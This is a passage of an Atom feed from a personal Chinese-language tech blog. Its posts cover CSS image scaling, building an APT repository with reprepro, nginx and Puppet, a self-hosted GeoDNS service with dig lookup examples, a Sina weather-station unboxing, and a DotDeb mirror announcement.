<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class">.content</span> <span class="tag">img</span><span class="class">.full-width</span> <span class="rules">&#123;</span><br><span class="line">	<span class="rule"><span class="attribute">max-width</span>:<span class="value"> <span class="number">100%</span></span></span>;</span><br><span class="line">	<span class="rule"><span class="attribute">max-height</span>:<span class="value"> <span class="number">100%</span></span></span>;</span><br><span class="line">	<span class="rule"><span class="attribute">width</span>:<span class="value"> auto</span></span>;</span><br><span class="line">	<span class="rule"><span class="attribute">height</span>:<span class="value"> auto</span></span>;</span><br><span class="line">&#125;</span></span><br></pre></td></tr></table></figure>
<p>非 IE6 下工作正常，不过这种老掉牙的浏览器就不要考虑它了。<br>（不过客户说还是要考虑的 … 望天 … 你在说神马 … 我不知道 IE6 是什么东西诶 …</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>嗯因为客户的站点编辑内容的时候上传的图片部分没有缩放，所以得在 CSS 上处理一下。</p>
<p>直接上代码咯。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span clas]]>
    </summary>
    
      <category term="- css
- CSS" scheme="https://blog.swan.im/tags/css-CSS/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用 Reprepro 构建自己的 APT 仓库]]></title>
    <link href="https://blog.swan.im/shi-yong-reprepro-gou-jian-zi-ji-de-apt-cang-ku/"/>
    <id>https://blog.swan.im/shi-yong-reprepro-gou-jian-zi-ji-de-apt-cang-ku/</id>
    <published>2013-09-02T03:54:00.000Z</published>
    <updated>2014-06-06T17:10:04.000Z</updated>
    <content type="html"><![CDATA[<p>最近使用 Puppet 的过程中，发现用 dpkg 做 Package 的 Provider 时总是会在报告里留下 <code>ensure changed &#39;purged&#39; to &#39;present&#39;</code> 这样子的日志，即使这个包已经被安装过了还是如此。</p>
<p>于是我的 Foreman 就被这样的日志强暴了三天。。。</p>
<p><img src="http://user-image.logdown.io/user/950/blog/939/post/99000/7yzg8uroT7WKkRfH8iBg_Snip20130903_16.png" alt="Snip20130903_16.png"></p>
<p>问了下 Eric 酱，好像只能自建 APT 仓库了，Debian 官方的 Wiki 里有好多种建立 APT 仓库的工具。<br>这里我使用 <strong>reprepro</strong>，功能足够，设置简单，嗯，就它了。</p>
<h2 id="安装_Reprepro">安装 Reprepro</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y reprepro</span><br></pre></td></tr></table></figure>
<h2 id="配置_Reprepro">配置 Reprepro</h2><p>首先呢，创建一个文件夹来存放你的仓库咯，我放在 <em>/data/repo/</em> 这个目录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /data/repo/conf</span><br></pre></td></tr></table></figure>
<p>然后需要创建 <code>distributions</code> 这个文件用来标识发行版，我管理的机器主要有三个发行版，以下的内容按自己实际情况修改：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Origin</span>: <span class="string">Aveline Swan</span></span><br><span class="line"><span class="attribute">Label</span>: <span class="string">aveline</span></span><br><span class="line"><span class="attribute">Suite</span>: <span class="string">precise</span></span><br><span class="line"><span class="attribute">Codename</span>: <span class="string">precise</span></span><br><span class="line"><span class="attribute">Version</span>: <span class="string">12.04</span></span><br><span class="line"><span class="attribute">Architectures</span>: <span class="string">i386 amd64</span></span><br><span class="line"><span class="attribute">Components</span>: <span class="string">main</span></span><br><span class="line"><span class="attribute">Description</span>: <span class="string">Packages for Aveline Swan</span></span><br><span class="line"></span><br><span class="line"><span class="http"><span class="attribute">Origin</span>: <span class="string">Aveline Swan</span></span><br><span class="line"><span class="attribute">Label</span>: <span class="string">aveline</span></span><br><span class="line"><span class="attribute">Suite</span>: <span class="string">squeeze</span></span><br><span class="line"><span class="attribute">Codename</span>: <span class="string">squeeze</span></span><br><span class="line"><span class="attribute">Version</span>: <span class="string">6.0</span></span><br><span class="line"><span class="attribute">Architectures</span>: <span class="string">i386 amd64</span></span><br><span class="line"><span class="attribute">Components</span>: <span class="string">main</span></span><br><span class="line"><span class="attribute">Description</span>: <span class="string">Packages for Aveline Swan</span></span><br><span class="line"></span><br><span class="line"><span class="http"><span class="attribute">Origin</span>: <span class="string">Aveline Swan</span></span><br><span class="line"><span class="attribute">Label</span>: <span class="string">aveline</span></span><br><span class="line"><span class="attribute">Suite</span>: <span class="string">wheezy</span></span><br><span class="line"><span class="attribute">Codename</span>: <span class="string">wheezy</span></span><br><span class="line"><span class="attribute">Version</span>: <span class="string">7.0</span></span><br><span class="line"><span class="attribute">Architectures</span>: <span class="string">i386 amd64</span></span><br><span class="line"><span class="attribute">Components</span>: <span class="string">main</span></span><br><span class="line"><span class="attribute">Description</span>: <span class="string">Packages for Aveline Swan</span></span></span></span><br></pre></td></tr></table></figure>
<h2 id="添加包">添加包</h2><p>在 <em>/data/repo</em> 这个目录执行 <code>reprepro includedeb 发行版 deb包位置</code> 命令添加既可。</p>
<h2 id="设置_Web_服务">设置 Web 服务</h2><p>这里我直接使用了 <em>nginx</em>，配置文件如下：</p>
<figure class="highlight nginxconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">server</span> &#123;</span><br><span class="line">	<span class="title">listen</span> <span class="number">80</span>;</span><br><span class="line">	<span class="title">server_name</span> apt.swan.im;</span><br><span class="line"></span><br><span class="line">	<span class="title">location</span> / &#123;</span><br><span class="line">		<span class="title">root</span> /home/apt;</span><br><span class="line">		<span class="title">autoindex</span> <span class="built_in">on</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  <span class="title">location</span> /conf &#123;</span><br><span class="line">		<span class="title">return</span> <span class="number">403</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="添加_APT_仓库到服务器">添加 APT 仓库到服务器</h2><p>在 Puppet Master 上执行 <code>puppet module install puppetlabs/apt</code> 安装 <strong>apt</strong> 模块。</p>
<p>然后在 <em>site.pp</em> 里添加</p>
<figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">include</span> apt</span><br><span class="line"></span><br><span class="line"><span class="keyword">apt::source &#123;</span> <span class="string">'swan'</span>:</span><br><span class="line">  <span class="function">location   =&gt;</span> <span class="string">'http://apt.swan.im'</span>,</span><br><span class="line">  <span class="function">repos      =&gt;</span> <span class="string">'main'</span>,</span><br><span class="line">  <span class="function">include_src=&gt;</span> <span class="keyword">false</span></span><br><span class="line"><span class="keyword">&#125;</span></span><br></pre></td></tr></table></figure>
<p>如果你的仓库里不包含源码的话，记得要把 <em>include_src</em> 这个设置为 <code>false</code>，不然会报错。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>最近使用 Puppet 的过程中，发现用 dpkg 做 Package 的 Provider 时总是会在报告里留下 <code>ensure changed &#39;purged&#39; to &#39;present&#39;</code> 这样子的日志，即使这个包已]]>
    </summary>
    
      <category term="- debian
- Debian
- Reprepro
- APT" scheme="https://blog.swan.im/tags/debian-Debian-Reprepro-APT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[New DNS Service]]></title>
    <link href="https://blog.swan.im/new-dns-service/"/>
    <id>https://blog.swan.im/new-dns-service/</id>
    <published>2013-08-11T04:56:00.000Z</published>
    <updated>2014-06-06T17:10:35.000Z</updated>
    <content type="html"><![CDATA[<p>一直有感於沒有足夠好用的 DNS 服務，於是自己寫了一個。</p>
<p>DNSPod 免費版限制太多收費版還是不夠好玩兒，Amazon Route53 的 Latency-Based 記錄也如同雞肋，完全起不到 GeoIP 的作用，至於 Dyn … 呃好吧這家比較贊但是我還是喜歡自己折騰一下XD</p>
<p>介紹一下架構：</p>
<p>DNS 基於 PowerDNS + NodeJS + MySQL，一共用了 18 + 2 + 2 台 VPS，DNS 節點內存均爲 1G。</p>
<p><del>其中 14 台是 AnyCast DNS，對外只用一個 IP，不過從監控來看好像只有幾個節點比較忙其他幾個都好冷清，感覺好浪費 :-(</del> <strong>使用率太低以及服務商響應速度不理想，已經下線</strong></p>
<p>另外 4 台是 UniCast DNS。</p>
<ul>
<li>DigitalOcean <strong>San Francisco Datacenter</strong> (ns1)</li>
<li>美團開放服務 <strong>北京數字北京機房</strong>(ns2)</li>
<li>Nlayer <strong>Los Angeles Datacenter</strong> (ns3)</li>
<li>ChinaCache <strong>北京順義海航機房</strong> (ns4)</li>
</ul>
<p>另外還有兩臺跑 Portal 和 API，和數據庫在同一個機房不過爲了保證被攻擊時被誤傷所以沒有放在同一臺機器上嗯。</p>
<p>至於 GeoDNS，我使用的是 MaxMind 的 GeoLite 庫和由魔熊維護的 SinaIP 庫來解析地址。</p>
<p>系統已經上線快一週了，運行正常，求壓力測試。</p>
<p>貼一張狀態照。</p>
<p><img src="http://user-image.logdown.io/user/950/blog/939/post/84721/ZmHs6UgORg6d3JVunGbD_QQ20130812-1.png" alt="QQ20130812-1.png"></p>
<p>吖，對了另外提供個小工具，可以通過 dig 來查詢自己的 IP 地址什麼的：<br>需要注意一下裏面的 TXT 記錄是用 <strong>Punycode</strong> 編碼過的。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查詢 IP 地址</span></span><br><span class="line">dig ip.noquery A @ns1.noquery.net</span><br><span class="line"><span class="comment"># 查詢 IP 所屬組織</span></span><br><span class="line">dig organization.geoip.engine.noquery TXT @ns1.noquery.net</span><br><span class="line"><span class="comment"># 查詢 IP 所在城市信息</span></span><br><span class="line">dig city.geoip.engine.noquery TXT @ns1.noquery.net</span><br><span class="line"><span class="comment"># 查詢 IP 所在國家信息</span></span><br><span class="line">dig country.geoip.engine.noquery TXT @ns1.noquery.net</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<p>一直有感於沒有足夠好用的 DNS 服務，於是自己寫了一個。</p>
<p>DNSPod 免費版限制太多收費版還是不夠好玩兒，Amazon Route53 的 Latency-Based 記錄也如同雞肋，完全起不到 GeoIP 的作用，至於 Dyn … 呃好吧這家比較贊但是我]]>
    </summary>
    
      <category term="- Default" scheme="https://blog.swan.im/tags/Default/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA['新浪气象站']]></title>
    <link href="https://blog.swan.im/xin-lang-qi-xiang-zhan/"/>
    <id>https://blog.swan.im/xin-lang-qi-xiang-zhan/</id>
    <published>2013-07-13T12:30:00.000Z</published>
    <updated>2013-07-13T12:30:00.000Z</updated>
    <content type="html"><![CDATA[<p>前几天在鱼老师的微博里看到一条卖萌微博然后发现了这个好玩儿的东西，看着不算贵就入了俩。</p>
<p>作为一个已经叛星的不折腾会死星人，拿个 Arduino 或者 Raspberry Pi 来自己做一个这种事我是再也不会做了，折腾下来的成本至少得 300 左右，不过这货只要 199 吖，果然量产的东西就是便宜。</p>
<p>嘛，那就来个 … 开<del>箱</del>盒报告吧。</p>
<p><img src="http://user-image.logdown.io/user/950/blog/939/post/18937/wo6OY3lgSwasyToElP5J_2013-07-14 12.23.41 HDR.jpg" alt="2013-07-14 12.23.41 HDR.jpg"></p>
<p>打开盒子从上到下从左到右依次是</p>
<ul>
<li>室内机电源线</li>
<li>固定用螺丝和螺丝起子</li>
<li>室外机</li>
<li>室内机</li>
<li>固定用 3M 双面胶带一块</li>
</ul>
<p><img src="http://user-image.logdown.io/user/950/blog/939/post/18937/coXa7kvyQbJkexexVADg_2013-07-14 12.26.06 HDR.jpg" alt="2013-07-14 12.26.06 HDR.jpg"></p>
<p>安装的话挺方便的，在 App Store 里下好新浪气象站的应用按着操作来就是了。</p>
<p>设置 Wi-Fi 的时候会要求连接以 Sina- 开头的一个 Wi-Fi 热点，连上之后会弹出一个窗口要求设置 Wi-Fi，设置完了这个热点就会消失了，这里顺便吐槽下 Cisco 的家用路由器 (CVR100W) 真是烂到爆，居然 … 第一次用 Cisco 的热点连不上去，然后无奈之下用 TP-LINK (WR340G) 的热点连居然连上了。</p>
<p>接下来是室外机，直接用附带的起子打开后盖拔出电池仓的压仓片就可以了，完成后室外机的 LCD 屏会有显示度数。</p>
<p>安装室外机的时候遇到了点儿小麻烦，由于一时二逼直接把 3M 的双面胶贴墙上了，呃，准确的说是贴在了墙上的灰尘上，然后现在是用透明胶带贴在了空调室外机上，应该暂时掉不下来。 :-D</p>
<p>嘛，这个就是新浪气象站的 App 啦。呃所需要注意的呢以下数据是<strong>非实时</strong>获取的，想要看实时数据呢得去室内机看。</p>
<p>另外这里面的 PM 2.5 是从新浪天气获取的数据，不是室外机获取的。</p>
<p><img src="http://user-image.logdown.io/user/950/blog/939/post/18937/MYobYVgyS3SKUFo1EsqI_2013-07-14 12.54.49.png" alt="2013-07-14 12.54.49.png"></p>
<p><img src="http://user-image.logdown.io/user/950/blog/939/post/18937/IgIfZTQmisXCHK8scLNQ_2013-07-14 12.27.29 HDR.jpg" alt="2013-07-14 12.27.29 HDR.jpg"></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>前几天在鱼老师的微博里看到一条卖萌微博然后发现了这个好玩儿的东西，看着不算贵就入了俩。</p>
<p>作为一个已经叛星的不折腾会死星人，拿个 Arduino 或者 Raspberry Pi 来自己做一个这种事我是再也不会做了，折腾下来的成本至少得 300 左右，不过这货只要]]>
    </summary>
    
      <category term="- Life
- Life
- Gadgets
- Review" scheme="https://blog.swan.im/tags/Life-Life-Gadgets-Review/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[New DotDeb Mirror in China]]></title>
    <link href="https://blog.swan.im/new-dotdeb-mirror-in-aliyun-china/"/>
    <id>https://blog.swan.im/new-dotdeb-mirror-in-aliyun-china/</id>
    <published>2013-07-11T12:07:00.000Z</published>
    <updated>2014-06-06T17:11:18.000Z</updated>
    <content type="html"><![CDATA[<p>I’ve just set up a mirror for DotDeb in China.</p>
<p>Update Frequency: <strong>Once every day</strong></p>
<p>URL: <a href="http://dotdeb.90g.org/" target="_blank" rel="external">http://dotdeb.90g.org/</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>I’ve just set up a mirror for DotDeb in China.</p>
<p>Update Frequency: <strong>Once every day</strong></p>
<p>URL: <a href="http://dotde]]>
    </summary>
    
      <category term="- Dotdeb" scheme="https://blog.swan.im/tags/Dotdeb/"/>
    
  </entry>
  
</feed>